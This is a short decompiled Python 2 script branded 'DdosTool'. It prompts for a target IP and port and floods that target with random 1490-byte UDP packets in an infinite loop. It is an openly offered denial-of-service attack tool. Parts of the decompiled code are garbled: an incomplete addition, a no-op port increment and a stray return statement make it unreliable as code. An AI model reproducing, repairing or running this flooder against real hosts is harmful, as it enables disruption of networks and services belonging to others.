
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : ddos.pyc
# Bytecode Version : 2.7
# Time : Sun Aug  9 11:45:04 2020
#---------------------------------------

import os
import sys
import time
import socket
import random
os.system('clear')
os.system('figlet Tegar ID')
os.system('figlet DdosTool')
os.system('sleep 2')
print 
ip = raw_input('IP    : ')
port = input('Port  : ')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
send = 0
while True:
    sock.sendto(bytes, (ip, port))
    send = send + 
    port = port + 0
    print 'send %s packet on %s port %s' % (send, ip, port)
    if port == 65534:
        port = 0
        continue
    return None
